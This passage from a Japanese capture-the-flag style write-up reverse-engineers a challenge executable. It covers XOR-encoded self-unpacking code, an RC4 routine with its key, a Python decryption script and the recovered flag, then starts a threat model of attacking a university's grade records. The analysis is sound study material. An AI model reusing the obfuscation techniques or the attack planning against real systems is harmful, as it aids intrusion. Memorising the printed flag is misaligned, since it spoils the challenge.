DAT_00406010;\n    uVar10 = FUN_00402920();"
      },
      "さらにFUN_00402920関数ではこのような処理がされていました。",
      {
        "type": "code",
        "code": "void FUN_00402920(void)\n\n{\n  int iVar1;\n  int iVar2;\n  \n  FUN_00401600();\n  iVar1 = VirtualAlloc(0,0x864,0x3000,0x40);\n  iVar2 = 0;\n  do {\n    *(byte *)(iVar1 + iVar2) = (&DAT_00403020)[iVar2] ^ 0x26;\n    iVar2 = iVar2 + 1;\n  } while (iVar2 != 0x864);\n  return;\n}"
      },
      "この部分で、0x40 は実行可能メモリを示しており、DAT_00403020の0x864バイトをXOR0x26で復号してそこに実行可能コードを展開しています。これは静的解析のXORエンコード処理部分に該当するのではないかと予測しました。この部分で実行可能コードを展開していると考えました。",
      "また、逆コンパイル部分のアセンブラを確認しました。",
      {
        "type": "code",
        "code": "LAB_00402980                                    XREF[2]:     00402962 (j) ,  00402995 (j)   \n        00402980 0f  b6  90       MOVZX      EDX ,byte ptr [EAX  + DAT_00403020 ]               = 73h\n                 20  30  40                                                                   = AFh\n                 00\n        00402987 83  f2  26       XOR        EDX ,0x26\n        0040298a 88  14  01       MOV        byte ptr [ECX  + EAX *0x1 ],DL\n        0040298d 83  c0  01       ADD        EAX ,0x1\n        00402990 3d  64  08       CMP        EAX ,0x864\n                 00  00\n        00402995 75  e9           JNZ        LAB_00402980\n        00402997 81  c1  9f       ADD        ECX ,0x39f\n                 03  00  00\n        0040299d 51              PUSH       ECX\n        0040299e c3              RET",
        "lang": "bash"
      },
      "`ADD ECX, 039f` → ECX = 復号済みバッファ+0x39f`PUSH ECX` → そのアドレスをスタックに積む`RET` → return = スタックトップに飛ぶ = ECXにJMP",
      "ここから、復号済みコードのオフセット0x39fから本物のロジックがあると考えました。",
      {
        "type": "heading",
        "level": 3,
        "text": "4. flag取得用ペイロードを作成"
      },
      {
        "type": "code",
        "code": "import struct\ndata = open('c5.exe', 'rb').read()\n\ne_lfanew = struct.unpack_from('<I', data, 0x3c)[0]\nimage_base = struct.unpack_from('<I', data, e_lfanew + 0x34)[0]\nnum_sections = struct.unpack_from('<H', data, e_lfanew + 6)[0]\nsize_opt = struct.unpack_from('<H', data, e_lfanew + 20)[0]\nsec_start = e_lfanew + 24 + size_opt\n\ntarget_rva = 0x403020 - image_base\nfor i in range(num_sections):\n    s = sec_start + i * 40\n    va = struct.unpack_from('<I', data, s + 12)[0]\n    vs = struct.unpack_from('<I', data, s + 8)[0]\n    ro = struct.unpack_from('<I', data, s + 20)[0]\n    if va <= target_rva < va + vs:\n        off = ro + (target_rva - va)\n        decoded = bytes(b ^ 0x26 for b in data[off:off+0x864])\n        open('payload.bin', 'wb').write(decoded)\n        print(hex(off), decoded[:16].hex())",
        "lang": "python"
      },
      {
        "type": "code",
        "code": "import re\ndata = open('payload.bin','rb').read()\nprint('=== 0x39f からのバイト（先頭16） ===')\nprint(data[0x39f:0x3af].hex())\nprint()\nprint('=== 0x39f 以降の文字列 ===')\nfor m in re.finditer(b'[ -~]{4,}', data[0x39f:]):\n    print(hex(0x39f + m.start()), repr(m.group().decode()))",
        "lang": "python"
      },
      "実行結果：",
      {
        "type": "code",
        "code": "=== 0x39f からのバイト（先頭16） ===\n5589e581ecf8000000c745c76b65726e\n\n=== 0x39f 以降の文字列 ===\n0x3ab 'kern'\n0x3b2 'el32'\n0x3b9 'l32.'\n0x3df 'GetP'\n0x3e6 'rocA'\n0x3ed 'Addr'\n0x41a 'GetS'\n0x421 'tdHa'\n0x428 'dHan'\n0x436 'Writ'\n0x43d 'eCon'\n0x444 'onso'",
        "lang": "bash"
      },
      "このスクリプトにより、0x39fから0x3afのバイナリデータを保存したpayload.binを作成しました。しかしこれだと、結局ＡＰＩ名しかわからず、flag取得は失敗してしまいました。ここからflagはスタック上に命令で構築させていると仮定して進めました。",
      {
        "type": "heading",
        "level": 3,
        "text": "5. さらにghidrunで解析"
      },
      "次にpayloadを逆アセンブル・逆コンパイルをしました。",
      {
        "type": "code",
        "code": "void FUN_0000039f(void)\n{\n  undefined1 uVar1;\n  uint uVar2;\n  undefined4 uVar3;\n  int iVar4;\n  int *piVar5;\n  ulonglong uVar6;\n  \n  uVar6 = (ulonglong)&stack0xfffffffffffffff8 & 0xffffffff;\n  piVar5 = (int *)(ulonglong)((int)&stack0xfffffffffffffff8 - 0xf8);\n  *(undefined4 *)(uVar6 - 0x39) = 0x6e72656b;\n  *(undefined4 *)(uVar6 - 0x35) = 0x32336c65;\n  *(undefined4 *)(uVar6 - 0x34) = 0x2e32336c;\n  *(undefined4 *)(uVar6 - 0x30) = 0x6c6c64;\n  *piVar5 = (int)&stack0xfffffffffffffff8 + -0x39;\n  piVar5[-2] = 0x3cf;\n  piVar5[-1] = 0;\n  uVar3 = FUN_0000007b();\n  *(undefined4 *)(uVar6 - 0x18) = uVar3;\n  if (*(int *)(uVar6 - 0x18) != 0) {\n    *(undefined4 *)(uVar6 - 0x48) = 0x50746547;\n    *(undefined4 *)(uVar6 - 0x44) = 0x41636f72;\n    *(undefined4 *)(uVar6 - 0x41) = 0x72646441;\n    *(undefined4 *)(uVar6 - 0x3d) = 0x737365;\n    piVar5[1] = (int)&stack0xfffffffffffffff8 + -0x48;\n    *piVar5 = *(undefined4 *)(uVar6 - 0x18);\n    piVar5[-2] = 0x40a;\n    piVar5[-1] = 0;\n    iVar4 = FUN_000000eb();\n    *(int *)(uVar6 - 0x1c) = iVar4;\n    if (*(int *)(uVar6 - 0x1c) != 0) {\n      *(undefined4 *)(uVar6 - 0x55) = 0x53746547;\n      *(undefined4 *)(uVar6 - 0x51) = 0x61486474;\n      *(undefined4 *)(uVar6 - 0x50) = 0x6e614864;\n      *(undefined4 *)(uVar6 - 0x4c) = 0x656c64;\n      *(undefined4 *)(uVar6 - 99) = 0x74697257;\n      *(undefined4 *)(uVar6 - 0x5f) = 0x6e6f4365;\n      *(undefined4 *)(uVar6 - 0x5d) = 0x6f736e6f;\n      *(undefined4 *)(uVar6 - 0x59) = 0x41656c;\n      piVar5[1] = (int)&stack0xfffffffffffffff8 + -0x55;\n      *piVar5 = *(undefined4 *)(uVar6 - 0x18);\n      uVar2 = *(uint *)(uVar6 - 0x1c);\n      piVar5[-2] = 0x461;\n      piVar5[-1] = 0;\n      uVar3 = (*(code *)(ulonglong)uVar2)();\n      *(undefined4 *)(uVar6 - 0x20) = uVar3;\n      piVar5[1] = (int)&stack0xfffffffffffffff8 + -99;\n      *piVar5 = *(undefined4 *)(uVar6 - 0x18);\n      uVar2 = *(uint *)(uVar6 - 0x1c);\n      piVar5[-2] = 0x476;\n      piVar5[-1] = 0;\n      uVar3 = (*(code *)(ulonglong)uVar2)();\n      *(undefined4 *)(uVar6 - 0x24) = uVar3;\n      if ((*(int *)(uVar6 - 0x20) != 0) && (*(int *)(uVar6 - 0x24) != 0)) {\n        *(undefined1 *)(uVar6 - 0x84) = 0x82;\n        *(undefined1 *)(uVar6 - 0x83) = 0xdb;\n        *(undefined1 *)(uVar6 - 0x82) = 0x72;\n        *(undefined1 *)(uVar6 - 0x81) = 0x58;\n        *(undefined1 *)(uVar6 - 0x80) = 0xec;\n        *(undefined1 *)(uVar6 - 0x7f) = 0x26;\n        *(undefined1 *)(uVar6 - 0x7e) = 0x98;\n        *(undefined1 *)(uVar6 - 0x7d) = 0xc9;\n        *(undefined1 *)(uVar6 - 0x7c) = 0x85;\n        *(undefined1 *)(uVar6 - 0x7b) = 0xc2;\n        *(undefined1 *)(uVar6 - 0x7a) = 0x43;\n        *(undefined1 *)(uVar6 - 0x79) = 0x5f;\n        *(undefined1 *)(uVar6 - 0x78) = 0xc;\n        *(undefined1 *)(uVar6 - 0x77) = 0x8d;\n        *(undefined1 *)(uVar6 - 0x76) = 0x20;\n        *(undefined1 *)(uVar6 - 0x75) = 0xb3;\n        *(undefined1 *)(uVar6 - 0x74) = 0xc0;\n        *(undefined1 *)(uVar6 - 0x73) = 0xad;\n        *(undefined1 *)(uVar6 - 0x72) = 0x45;\n        *(undefined1 *)(uVar6 - 0x71) = 0x3a;\n        *(undefined1 *)(uVar6 - 0x70) = 0xaa;\n        *(undefined1 *)(uVar6 - 0x6f) = 0x4f;\n        *(undefined1 *)(uVar6 - 0x6e) = 0;\n        *(undefined1 *)(uVar6 - 0x6d) = 9;\n        *(undefined1 *)(uVar6 - 0x6c) = 0x50;\n        *(undefined1 *)(uVar6 - 0x6b) = 0x5d;\n        *(undefined1 *)(uVar6 - 0x6a) = 0x52;\n        *(undefined1 *)(uVar6 - 0x69) = 0x6f;\n        *(undefined1 *)(uVar6 - 0x68) = 0x73;\n        *(undefined1 *)(uVar6 - 0x67) = 0xbf;\n        *(undefined1 *)(uVar6 - 0x66) = 0xab;\n        *(undefined1 *)(uVar6 - 0x65) = 0xb3;\n        *(undefined1 *)(uVar6 - 100) = 0xf2;\n        *(undefined1 *)(uVar6 - 0x8a) = 0x32;\n        *(undefined1 *)(uVar6 - 0x89) = 0x30;\n        *(undefined1 *)(uVar6 - 0x88) = 0x32;\n        *(undefined1 *)(uVar6 - 0x87) = 0x36;\n        *(undefined1 *)(uVar6 - 0x86) = 99;\n        *(undefined1 *)(uVar6 - 0x85) = 0x32;\n        *(undefined4 *)(uVar6 - 0x28) = 0x21;\n        *(undefined1 *)(uVar6 - 0xad) = *(undefined1 *)(uVar6 - 0x84);\n        *(undefined1 *)(uVar6 - 0xac) = *(undefined1 *)(uVar6 - 0x83);\n        *(undefined1 *)(uVar6 - 0xab) = *(undefined1 *)(uVar6 - 0x82);\n        *(undefined1 *)(uVar6 - 0xaa) = *(undefined1 *)(uVar6 - 0x81);\n        *(undefined1 *)(uVar6 - 0xa9) = *(undefined1 *)(uVar6 - 0x80);\n        *(undefined1 *)(uVar6 - 0xa8) = *(undefined1 *)(uVar6 - 0x7f);\n        *(undefined1 *)(uVar6 - 0xa7) = *(undefined1 *)(uVar6 - 0x7e);\n        *(undefined1 *)(uVar6 - 0xa6) = *(undefined1 *)(uVar6 - 0x7d);\n        *(undefined1 *)(uVar6 - 0xa5) = *(undefined1 *)(uVar6 - 0x7c);\n        *(undefined1 *)(uVar6 - 0xa4) = *(undefined1 *)(uVar6 - 0x7b);\n        *(undefined1 *)(uVar6 - 0xa3) = *(undefined1 *)(uVar6 - 0x7a);\n        *(undefined1 *)(uVar6 - 0xa2) = *(undefined1 *)(uVar6 - 0x79);\n        *(undefined1 *)(uVar6 - 0xa1) = *(undefined1 *)(uVar6 - 0x78);\n        *(undefined1 *)(uVar6 - 0xa0) = *(undefined1 *)(uVar6 - 0x77);\n        *(undefined1 *)(uVar6 - 0x9f) = *(undefined1 *)(uVar6 - 0x76);\n        *(undefined1 *)(uVar6 - 0x9e) = *(undefined1 *)(uVar6 - 0x75);\n        *(undefined1 *)(uVar6 - 0x9d) = *(undefined1 *)(uVar6 - 0x74);\n        *(undefined1 *)(uVar6 - 0x9c) = *(undefined1 *)(uVar6 - 0x73);\n        *(undefined1 *)(uVar6 - 0x9b) = *(undefined1 *)(uVar6 - 0x72);\n        *(undefined1 *)(uVar6 - 0x9a) = *(undefined1 *)(uVar6 - 0x71);\n        *(undefined1 *)(uVar6 - 0x99) = *(undefined1 *)(uVar6 - 0x70);\n        *(undefined1 *)(uVar6 - 0x98) = *(undefined1 *)(uVar6 - 0x6f);\n        *(undefined1 *)(uVar6 - 0x97) = *(undefined1 *)(uVar6 - 0x6e);\n        *(undefined1 *)(uVar6 - 0x96) = *(undefined1 *)(uVar6 - 0x6d);\n        *(undefined1 *)(uVar6 - 0x95) = *(undefined1 *)(uVar6 - 0x6c);\n        *(undefined1 *)(uVar6 - 0x94) = *(undefined1 *)(uVar6 - 0x6b);\n        *(undefined1 *)(uVar6 - 0x93) = *(undefined1 *)(uVar6 - 0x6a);\n        *(undefined1 *)(uVar6 - 0x92) = *(undefined1 *)(uVar6 - 0x69);\n        *(undefined1 *)(uVar6 - 0x91) = *(undefined1 *)(uVar6 - 0x68);\n        *(undefined1 *)(uVar6 - 0x90) = *(undefined1 *)(uVar6 - 0x67);\n        *(undefined1 *)(uVar6 - 0x8f) = *(undefined1 *)(uVar6 - 0x66);\n        *(undefined1 *)(uVar6 - 0x8e) = *(undefined1 *)(uVar6 - 0x65);\n        *(undefined1 *)(uVar6 - 0x8d) = *(undefined1 *)(uVar6 - 100);\n        piVar5[3] = *(int *)(uVar6 - 0x28);\n        piVar5[2] = (int)&stack0xfffffffffffffff8 + -0xad;\n        piVar5[1] = 6;\n        *piVar5 = (int)&stack0xfffffffffffffff8 + -0x8a;\n        piVar5[-2] = 0x6cb;\n        piVar5[-1] = 0;\n        FUN_000001fc();\n        *(undefined1 *)\n         (ulonglong)(uint)(*(int *)(uVar6 - 0x28) + (int)&stack0xfffffffffffffff8 + -0xad) = 0;\n        *(undefined1 *)(uVar6 - 0xc6) = 0x44;\n        *(undefined1 *)(uVar6 - 0xc5) = 0x55;\n        *(undefined1 *)(uVar6 - 0xc4) = 0x4d;\n        *(undefined1 *)(uVar6 - 0xc3) = 0x4d;\n        *(undefined1 *)(uVar6 - 0xc2) = 0x59;\n        *(undefined1 *)(uVar6 - 0xc1) = 0x5f;\n        *(undefined1 *)(uVar6 - 0xc0) = 0x70;\n        *(undefined1 *)(uVar6 - 0xbf) = 0x61;\n        *(undefined1 *)(uVar6 - 0xbe) = 100;\n        *(undefined1 *)(uVar6 - 0xbd) = 100;\n        *(undefined1 *)(uVar6 - 0xbc) = 0x69;\n        *(undefined1 *)(uVar6 - 0xbb) = 0x6e;\n        *(undefined1 *)(uVar6 - 0xba) = 0x67;\n        *(undefined1 *)(uVar6 - 0xb9) = 0x30;\n        *(undefined1 *)(uVar6 - 0xb8) = 0x30;\n        *(undefined1 *)(uVar6 - 0xb7) = 0x30;\n        *(undefined1 *)(uVar6 - 0xb6) = 0x30;\n        *(undefined1 *)(uVar6 - 0xb5) = 0x30;\n        *(undefined1 *)(uVar6 - 0xb4) = 0x5f;\n        *(undefined1 *)(uVar6 - 0xb3) = 0x44;\n        *(undefined1 *)(uVar6 - 0xb2) = 0x55;\n        *(undefined1 *)(uVar6 - 0xb1) = 0x4d;\n        *(undefined1 *)(uVar6 - 0xb0) = 0x4d;\n        *(undefined1 *)(uVar6 - 0xaf) = 0x59;\n        *(undefined1 *)(uVar6 - 0xae) = 0;\n        *(int *)(uVar6 - 0xc) = (int)&stack0xfffffffffffffff8 + -0xa5;\n        *(int *)(uVar6 - 0x10) = (int)&stack0xfffffffffffffff8 + -0xc6;\n        while (*(char *)(ulonglong)*(uint *)(uVar6 - 0x10) != '\\0') {\n          uVar2 = *(uint *)(uVar6 - 0x10);\n          *(uint *)(uVar6 - 0x10) = uVar2 + 1;\n          uVar1 = *(undefined1 *)(ulonglong)uVar2;\n          uVar2 = *(uint *)(uVar6 - 0xc);\n          *(uint *)(uVar6 - 0xc) = uVar2 + 1;\n          *(undefined1 *)(ulonglong)uVar2 = uVar1;\n        }\n        *(undefined1 *)(ulonglong)*(uint *)(uVar6 - 0xc) = 0x7d;\n        *(undefined1 *)(ulonglong)(*(int *)(uVar6 - 0xc) + 1) = 0;\n        *piVar5 = 0xfffffff5;\n        uVar2 = *(uint *)(uVar6 - 0x20);\n        piVar5[-2] = 0x7dd;\n        piVar5[-1] = 0;\n        uVar3 = (*(code *)(ulonglong)uVar2)();\n        *(undefined4 *)(uVar6 - 0x2c) = uVar3;\n        *(undefined4 *)(uVar6 - 0x14) = 0;\n        while (*(char *)(ulonglong)\n                        (uint)(*(int *)(uVar6 - 0x14) + (int)&stack0xfffffffffffffff8 + -0xad) !=\n               '\\0') {\n          *(int *)(uVar6 - 0x14) = *(int *)(uVar6 - 0x14) + 1;\n        }\n        *(undefined1 *)\n         (ulonglong)(uint)(*(int *)(uVar6 - 0x14) + (int)&stack0xfffffffffffffff8 + -0xad) = 10;\n        *(undefined1 *)((uVar6 - 0xad) + (ulonglong)(*(int *)(uVar6 - 0x14) + 1)) = 0;\n        *(undefined4 *)(uVar6 - 0xcc) = 0;\n        iVar4 = *(int *)(uVar6 - 0x14);\n        piVar5[4] = 0;\n        piVar5[3] = (int)&stack0xfffffffffffffff8 + -0xcc;\n        piVar5[2] = iVar4 + 1;\n        piVar5[1] = (int)&stack0xfffffffffffffff8 + -0xad;\n        *piVar5 = *(undefined4 *)(uVar6 - 0x2c);\n        uVar2 = *(uint *)(uVar6 - 0x24);\n        piVar5[-2] = 0x856;\n        piVar5[-1] = 0;\n        (*(code *)(ulonglong)uVar2)();\n      }\n    }\n  }\n  return;\n}"
      },
      "上記の結果から、プログラムが本物のflagを一度デコードしてから中身をDUMMYに上書きするという処理があることが分かりました。",
      "暗号データ：",
      {
        "type": "code",
        "code": "    0x82, 0xdb, 0x72, 0x58, 0xec, 0x26, 0x98, 0xc9,\n    0x85, 0xc2, 0x43, 0x5f, 0x0c, 0x8d, 0x20, 0xb3,\n    0xc0, 0xad, 0x45, 0x3a, 0xaa, 0x4f, 0x00, 0x09,\n    0x50, 0x5d, 0x52, 0x6f, 0x73, 0xbf, 0xab, 0xb3, 0xf2",
        "lang": "bash"
      },
      "キー：",
      {
        "type": "code",
        "code": "2026c2",
        "lang": "bash"
      },
      "ここで初めてプログラムを一度実行し、出力結果を確認しました。",
      {
        "type": "code",
        "code": "└─$ ./c5.exe\nseccanp{DUMMY_padding00000_DUMMY}",
        "lang": "bash"
      },
      "本来の出力は上記のカッコ内の文字列が異なるものである可能性が高いと考えました。",
      "さらに関数`FUN_000001fc`についても逆コンパイル結果を見ました。",
      {
        "type": "code",
        "code": "void FUN_000001fc(void)\n\n{\n  ulonglong uVar1;\n  \n  uVar1 = (ulonglong)&stack0xfffffffffffffff8 & 0xffffffff;\n  *(undefined4 *)(uVar1 - 0xc) = 0;\n  *(undefined4 *)(uVar1 - 8) = 0;\n  while (*(uint *)(uVar1 - 8) < 0x100) {\n    *(char *)(ulonglong)(uint)(*(int *)(uVar1 - 8) + (int)&stack0xfffffffffffffff8 + -0x112) =\n         (char)*(undefined4 *)(uVar1 - 8);\n    *(int *)(uVar1 - 8) = *(int *)(uVar1 - 8) + 1;\n  }\n  *(undefined4 *)(uVar1 - 8) = 0;\n  while (*(uint *)(uVar1 - 8) < 0x100) {\n    *(uint *)(uVar1 - 0xc) =\n         (uint)*(byte *)(ulonglong)\n                        (*(int *)(uVar1 + 8) + *(uint *)(uVar1 - 8) % *(uint *)(uVar1 + 0xc)) +\n         (uint)*(byte *)(ulonglong)\n                        (uint)(*(int *)(uVar1 - 8) + (int)&stack0xfffffffffffffff8 + -0x112) +\n         *(int *)(uVar1 - 0xc) & 0xff;\n    *(undefined1 *)(uVar1 - 0x12) =\n         *(undefined1 *)\n          (ulonglong)(uint)(*(int *)(uVar1 - 8) + (int)&stack0xfffffffffffffff8 + -0x112);\n    *(undefined1 *)(ulonglong)(uint)(*(int *)(uVar1 - 8) + (int)&stack0xfffffffffffffff8 + -0x112) =\n         *(undefined1 *)\n          (ulonglong)(uint)(*(int *)(uVar1 - 0xc) + (int)&stack0xfffffffffffffff8 + -0x112);\n    *(undefined1 *)(ulonglong)(uint)((int)&stack0xfffffffffffffff8 + -0x112 + *(int *)(uVar1 - 0xc))\n         = *(undefined1 *)(uVar1 - 0x12);\n    *(int *)(uVar1 - 8) = *(int *)(uVar1 - 8) + 1;\n  }\n  *(undefined4 *)(uVar1 - 8) = 0;\n  *(undefined4 *)(uVar1 - 0xc) = 0;\n  *(undefined4 *)(uVar1 - 0x10) = 0;\n  while (*(uint *)(uVar1 - 0x10) < *(uint *)(uVar1 + 0x14)) {\n    *(uint *)(uVar1 - 8) = *(int *)(uVar1 - 8) + 1U & 0xff;\n    *(uint *)(uVar1 - 0xc) =\n         *(int *)(uVar1 - 0xc) +\n         (uint)*(byte *)(ulonglong)\n                        (uint)(*(int *)(uVar1 - 8) + (int)&stack0xfffffffffffffff8 + -0x112) & 0xff;\n    *(undefined1 *)(uVar1 - 0x11) =\n         *(undefined1 *)\n          (ulonglong)(uint)(*(int *)(uVar1 - 8) + (int)&stack0xfffffffffffffff8 + -0x112);\n    *(undefined1 *)(ulonglong)(uint)(*(int *)(uVar1 - 8) + (int)&stack0xfffffffffffffff8 + -0x112) =\n         *(undefined1 *)\n          (ulonglong)(uint)(*(int *)(uVar1 - 0xc) + (int)&stack0xfffffffffffffff8 + -0x112);\n    *(undefined1 *)(ulonglong)(uint)((int)&stack0xfffffffffffffff8 + -0x112 + *(int *)(uVar1 - 0xc))\n         = *(undefined1 *)(uVar1 - 0x11);\n    *(byte *)(ulonglong)(uint)(*(int *)(uVar1 - 0x10) + *(int *)(uVar1 + 0x10)) =\n         *(byte *)(ulonglong)(uint)(*(int *)(uVar1 - 0x10) + *(int *)(uVar1 + 0x10)) ^\n         *(byte *)((uVar1 - 0x112) +\n                  (ulonglong)\n                  (byte)(*(char *)(ulonglong)\n                                  (uint)(*(int *)(uVar1 - 0xc) +\n                                        (int)&stack0xfffffffffffffff8 + -0x112) +\n                        *(char *)(ulonglong)\n                                 (uint)(*(int *)(uVar1 - 8) + (int)&stack0xfffffffffffffff8 + -0x112\n                                       )));\n    *(int *)(uVar1 - 0x10) = *(int *)(uVar1 - 0x10) + 1;\n  }\n  return;\n}",
        "lang": "bash"
      },
      "上記の逆コンパイル結果の内、以下のパターンが目につきました。",
      {
        "type": "list",
        "items": [
          "0x100（256）回のループが2段ある",
          "最初のループで S[i] = i という連番初期化をしている",
          "2段目でインデックス j が key[i % key_len] に依存して更新され、swap が発生する",
          "最後のループで S[S[i]+S[j]] をインデックスにしてXORを取る"
        ]
      },
      "この「256要素S-box ＋ 2段初期化 ＋ S[S[i]+S[j]] XOR」という構造はストリーム暗号の特徴に見えたため、RC4ではないかと考えました。Wikipedia及びAIでRC4のアルゴリズムと照合したところ完全に一致することを確認しました。上記の結果からRC4というアルゴリズムであると確信しました。",
      {
        "type": "heading",
        "level": 3,
        "text": "6. 攻撃スクリプトの実行"
      },
      {
        "type": "code",
        "code": "def rc4(key, data):\n    S = list(range(256))\n    j = 0\n    for i in range(256):\n        j = (j + S[i] + key[i % len(key)]) & 0xFF\n        S[i], S[j] = S[j], S[i]\n    i = j = 0\n    result = []\n    for byte in data:\n        i = (i + 1) & 0xFF\n        j = (j + S[i]) & 0xFF\n        S[i], S[j] = S[j], S[i]\n        result.append(byte ^ S[(S[i] + S[j]) & 0xFF])\n    return bytes(result)\n\nencoded = bytes([\n    0x82, 0xdb, 0x72, 0x58, 0xec, 0x26, 0x98, 0xc9,\n    0x85, 0xc2, 0x43, 0x5f, 0x0c, 0x8d, 0x20, 0xb3,\n    0xc0, 0xad, 0x45, 0x3a, 0xaa, 0x4f, 0x00, 0x09,\n    0x50, 0x5d, 0x52, 0x6f, 0x73, 0xbf, 0xab, 0xb3, 0xf2\n])\n\nprint(rc4(b'2026c2', encoded))",
        "lang": "python"
      },
      "実行結果",
      {
        "type": "code",
        "code": "b'seccanp{th3_truth_1ie5_0n_m3m0ry}'",
        "lang": "bash"
      },
      "以上のプロセスにより、flagを取得できました。",
      {
        "type": "heading",
        "level": 3,
        "text": "7. 動的解析"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "7-1. 解析に至った経緯"
      },
      "上記の解析において、懸念点としてflag形式が提示されたものと異なるという問題がありました。私は'secca**m**p{???}'という形式で解答があると考えていましたが、最終的な回答は'secca**n**p{???}'になっていました。また、獲得したflagが「the_truth_lies_on_memory」のアナグラムとなっており、この問題は静的な解析ではなく、動的にメモリを確認することが必要であると確信しました。",
      {
        "type": "heading",
        "level": 4,
        "text": "7-2. 使用ツール"
      },
      "x32dbg（32bit Windows用デバッガ）",
      {
        "type": "heading",
        "level": 4,
        "text": "7-3. ステップ実行"
      },
      "c5.exeをx32dbgで開くと、バイナリのロードベースがGhidraの解析値（`0x00400000`）からずれていました。",
      {
        "type": "table",
        "header": [
          "項目",
          "Ghidraの値",
          "実際の値"
        ],
        "rows": [
          [
            "エントリポイント",
            "`0x00401460`",
            "`0x00C61460`"
          ],
          [
            "FUN_00402920（main相当）",
            "`0x00402920`",
            "`0x00C62920`"
          ],
          [
            "ASLRオフセット",
            "-",
            "`+0x008C0000`"
          ]
        ]
      },
      "何度かステップ実行させていく中で、VirtualAllocの戻り値（ペイロードのベースアドレス）は実行毎に変化していることが分かりました。",
      {
        "type": "heading",
        "level": 4,
        "text": "7-4. ブレークポイント設置"
      },
      "ブレークポイントを配置する際、VirtualAlloc直後（ペイロードのXOR復号前）にソフトウェアブレークポイント（INT3）を`BASE+0x6CB`に設置しても、XOR復号ループが同アドレスに復号済みバイトを書き込むため、ブレークポイントが上書きされて機能しないことが分かりました。",
      {
        "type": "list",
        "items": [
          "bp BASE+0x6CB を設定（x32dbgがINT3=0xCCを書き込む）",
          "XOR復号ループが BASE+0x6CB に復号バイトを書き込む",
          "INT3が上書きされブレークポイント消滅 → 素通りして例外"
        ],
        "ordered": true
      },
      "この問題への対応として、XOR復号ループ終了直後（`0x00C62997`）で止めてから、復号済みのメモリに対してブレークポイントを設置しました。",
      {
        "type": "heading",
        "level": 4,
        "text": "7-5. F9で実行"
      },
      "そのままDUMMY上書き前までステップ実行を行いました。",
      {
        "type": "list",
        "items": [
          "ADD ECX, 0x39F",
          "PUSH ECX",
          "RET",
          "ペイロード(BASE+0x39F)へジャンプ",
          "kernel32.dll動的解決",
          "RC4呼び出し（FUN_000001fc）",
          "BASE+0x6CB で停止"
        ],
        "ordered": true
      },
      {
        "type": "heading",
        "level": 4,
        "text": "7-6. スタック上のフラグ確認"
      },
      {
        "type": "code",
        "code": "dump esp",
        "lang": "bash"
      },
      "Dump パネル上でCtrl+B（バイナリ検索）→ `np{` を入力して検索しました。結果、静的解析で得たflagと同様の値が確認できました。",
      {
        "type": "code",
        "code": "seccanp{th3_truth_1ie5_0n_m3m0ry}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "7-7. 確認したこと"
      },
      {
        "type": "list",
        "items": [
          "ミスリードではなく、RC4復号結果が本物のフラグであること。",
          "静的解析で推測した動き（フラグはRC4復号直後の一瞬だけスタック上に存在し、その後DUMMYで上書きされること）が実際に起こっている事。",
          "フラグ名「the truth lies on memory」通り、真実は実行時メモリの中にのみ存在する構造になっていること。"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "8. 使用ツール"
      },
      {
        "type": "table",
        "header": [
          "ツール",
          "用途"
        ],
        "rows": [
          [
            "`file`",
            "バイナリ形式の確認"
          ],
          [
            "`rabin2`",
            "PE ヘッダ情報の取得"
          ],
          [
            "`objdump`",
            "インポートテーブル・セクション情報"
          ],
          [
            "`strings`",
            "可読文字列の抽出"
          ],
          [
            "Python3",
            "XOR デコード・RC4 復号スクリプト"
          ],
          [
            "Ghidra",
            "逆アセンブル・デコンパイル"
          ]
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "9. 全体の構造まとめ"
      },
      {
        "type": "code",
        "code": "c5.exe（PE32 / stripped）\n│\n├─【隠蔽レイヤー1】.data セクション内の API 名\n│   XOR 0x26 でエンコード\n│   → kernel32.dll, GetProcAddress, GetStdHandle, WriteConsoleA\n│\n├─【隠蔽レイヤー2】自己書き換えコード\n│   VirtualAlloc(PAGE_EXECUTE_READWRITE) で実行可能メモリ確保\n│   DAT_00403020 の 0x864 バイトを XOR 0x26 で復号 → ペイロード展開\n│   PUSH ECX+0x39f; RET でジャンプ（JMP 隠蔽テクニック）\n│\n└─【隠蔽レイヤー3】ペイロード内の RC4 暗号\n    RC4(key=\"2026c2\") で 33 バイトを復号 → 本物のフラグ\n    フラグの本体(byte 8-31)を DUMMY で上書きしてから出力\n    → 静的解析・動的解析どちらでも簡単には見えない構造"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "問6",
        "id": "section-6"
      },
      {
        "type": "problem",
        "blocks": [
          "【前提】",
          {
            "type": "list",
            "items": [
              "解答の過程で、攻撃のアイデアや攻撃の実証方法が浮かんだとしても、絶対に実行しないでください。分析するだけです",
              "解答の中で、具体的なシステム名を特定できるような記載はしないでください。例えば学校名や、その学校固有の用語などの使用は避けてください",
              "解答はひとつだけでも、複数でも構いません。解答の数よりも内容を重視します",
              "生成AIを使わずに回答してください"
            ]
          }
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "問１：攻撃者の視点"
      },
      {
        "type": "problem",
        "blocks": [
          "あなたがいま通っている学校（あるいは身近なほかの組織でも可）を、サイバー攻撃をする人になったつもりで分析し、以下について回答してください。",
          "[A] 動機/Motive：攻撃者があなたの学校を狙うことによって、最終的に達成したいこと（攻撃者が得られるもの）は何ですか？（例：出席日数をごまかし、卒業する）",
          "[B] 攻撃目標/Goals、 Crown Jewels：上記を達成するためのサイバー攻撃オペレーションにおいて、どんな状態になったら「攻撃プロジェクトが成功した」と判断できるでしょうか？（例：授業記録データベースを改ざんできる権限の取得）",
          "[C] 攻撃経路・手段/Attack Paths：上記攻撃目標を達成するために、どんな攻撃経路・攻撃手段が存在するでしょうか？（例：学務課のパソコンをマルウェアに感染させる。そのために…）"
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "[A] 動機/Motive"
      },
      "大学の保持している学生の成績を改ざんすることが動機として考えられます。理由は大きく２つあります。",
      {
        "type": "list",
        "items": [
          "**攻撃対象の資金面**: 現在私が属している大学は国立大学であり、国立と私立では大学から捻出することのできる資金力に大きな差があります。攻撃者がお金を目的として攻撃する可能性は低いと考えます。仮に情報を取得・改ざんして不正に資金を得ようとする場合、同じ大学でも私立を狙う可能性が高いと推測します。",
